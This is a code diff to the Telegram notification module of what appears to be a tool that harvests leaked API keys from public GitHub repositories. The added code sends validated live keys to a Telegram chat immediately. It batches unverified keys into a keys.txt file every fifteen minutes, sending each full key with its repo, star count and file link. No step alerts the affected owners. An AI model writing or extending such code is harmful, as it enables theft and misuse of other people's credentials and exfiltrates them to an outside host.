@@ -1,12 +1,26 @@
+import io
 import json
 import httpx
 import logging
+import asyncio
 from datetime import datetime, timezone, timedelta
 from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
 
 log = logging.getLogger(__name__)
 
-_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+_URL     = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+_DOC_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+
+# ── Unverified-key buffer (batched every 15 min as text file) ──────────────────
+_BUFFER: list[dict] = []
+_BUFFER_LOCK: asyncio.Lock | None = None
+
+
+def _lock() -> asyncio.Lock:
+    global _BUFFER_LOCK
+    if _BUFFER_LOCK is None:
+        _BUFFER_LOCK = asyncio.Lock()
+    return _BUFFER_LOCK
 
 _PROVIDER_EMOJI = {
     "openai":     "🟢",
@@ -35,20 +49,78 @@ async def _send(text: str, parse_mode: str = "HTML"):
 async def notify_found(provider: str, key: str, repo: str, file_path: str,
                        file_url: str, stars: int, created_at: str,
                        file_type: str, is_valid: bool):
-    status = "✅ VALID LIVE KEY" if is_valid else "⚠️ FOUND (unverified)"
-    emoji  = _PROVIDER_EMOJI.get(provider, "🔑")
-    age    = created_at[:10] if created_at else "unknown"
+    emoji = _PROVIDER_EMOJI.get(provider, "🔑")
+    age   = created_at[:10] if created_at else "unknown"
 
-    msg = (
-        f"{status} {emoji}\n"
-        f"<b>Provider:</b> {provider.upper()}\n"
-        f"<b>Key:</b> <code>{key}</code>\n"
-        f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>\n"
-        f"<b>Stars:</b> ⭐ {stars}  |  created {age}\n"
-        f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
-        f"<b>Type:</b> {file_type}"
-    )
-    await _send(msg)
+    if is_valid:
+        # Valid keys → immediate individual message
+        msg = (
+            f"✅ VALID LIVE KEY {emoji}\n"
+            f"<b>Provider:</b> {provider.upper()}\n"
+            f"<b>Key:</b> <code>{key}</code>\n"
+            f"<b>Repo:</b> <a href='https://github.com/{repo}'>{repo}</a>\n"
+            f"<b>Stars:</b> ⭐ {stars}  |  created {age}\n"
+            f"<b>File:</b> <a href='{file_url}'>{file_path}</a>\n"
+            f"<b>Type:</b> {file_type}"
+        )
+        await _send(msg)
+    else:
+        # Unverified → buffer, flushed every 15 min as text file
+        async with _lock():
+            _BUFFER.append({
+                "provider": provider, "key": key, "repo": repo,
+                "file_path": file_path, "file_url": file_url,
+                "stars": stars, "file_type": file_type, "age": age,
+            })
+
+
+async def flush_unverified_buffer() -> int:
+    """
+    Send buffered unverified finds as a Telegram document (text file).
+    Clears the buffer. Returns number of keys sent.
+    """
+    async with _lock():
+        if not _BUFFER:
+            return 0
+        data = list(_BUFFER)
+        _BUFFER.clear()
+
+    by_prov: dict[str, list] = {}
+    for r in data:
+        by_prov.setdefault(r["provider"], []).append(r)
+
+    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+    lines = [
+        f"⚠️  Unverified keys batch — {now_str}",
+        f"Total: {len(data)}  |  Providers: {len(by_prov)}",
+        "=" * 72,
+    ]
+    for prov in sorted(by_prov):
+        e    = _PROVIDER_EMOJI.get(prov, "🔑")
+        rows = by_prov[prov]
+        lines.append(f"\n{e} {prov.upper()} — {len(rows)} keys")
+        lines.append("-" * 60)
+        for r in rows[:200]:  # hard cap per provider in one file
+            lines.append(
+                f"  {r['key']}\n"
+                f"    repo={r['repo']}  ⭐{r['stars']}  type={r['file_type']}\n"
+                f"    {r['file_url']}"
+            )
+
+    content = "\n".join(lines).encode("utf-8")
+    caption = f"⚠️ {len(data)} unverified keys | {', '.join(f'{p.upper()}={len(v)}' for p, v in sorted(by_prov.items()))}"[:1024]
+
+    try:
+        async with httpx.AsyncClient(timeout=30) as c:
+            await c.post(
+                _DOC_URL,
+                data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
+                files={"document": ("keys.txt", io.BytesIO(content), "text/plain")},
+            )
+    except Exception as e:
+        log.error("flush buffer err: %s", e)
+
+    return len(data)
 
 
 async def notify_cycle_done(stats: dict):
